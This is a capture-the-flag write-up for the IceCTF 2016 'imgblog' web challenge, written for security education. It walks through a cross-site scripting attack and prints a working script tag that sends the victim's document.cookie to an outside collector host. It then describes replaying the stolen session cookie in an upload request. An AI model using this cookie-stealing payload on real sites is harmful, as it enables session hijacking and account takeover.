# IceCTF-2016 : imgblog-130

**Category:** Web
**Points:** 130
**Description:**

I found this amazing blog about Iceland! Did I ever tell you that I love Iceland? It seems to be made from scratch by a single guy although being impressive, he doesn't seem too have much experience with web programming. Can you see if you can find any vulnerabilites to pwn his machine?

## Writeup

The description indicates the victim's machine is the intended target. From there, we can assume it has something to do with the backend / server portion of the challenge. After some looking around, the session cookie turns out to be the one vector really open to attack. To collect the cookie, use a website to collect the request like [requestbin](http://requestb.in/), and paste the following HTML tag into the DOM, so the browser executes it, and sends your cookeis to the requestbin server: `<script>image=new Image();image.src='http://a.b.c.d:40001/?'+document.cookie;</script>`. Next, find a request sender like [hurl.it](https://hurl.it) and send a POST request to `/upload` (you can find that by tracing an upload) with `HTTP/1.1`, the host `imgblog.vuln.icec.tf` with the session cookie you got in your request bin. 

## Other write-ups and resources

* https://tsublogs.wordpress.com/2016/08/26/icectf-imgblog-web130/
* https://chrisissing.wordpress.com/2016/08/21/icectf-imgblog-write-up/
* https://github.com/73696e65/ctf-notes/blob/master/2016-IceCTF/ImgBlog-Web-120.txt
* https://github.com/318BR/IceCTF/tree/master/2016/Stage4/ImgBlog
* https://github.com/TeamContagion/CTF-Write-Ups/blob/master/icectf-2016/Web/ImgBlog
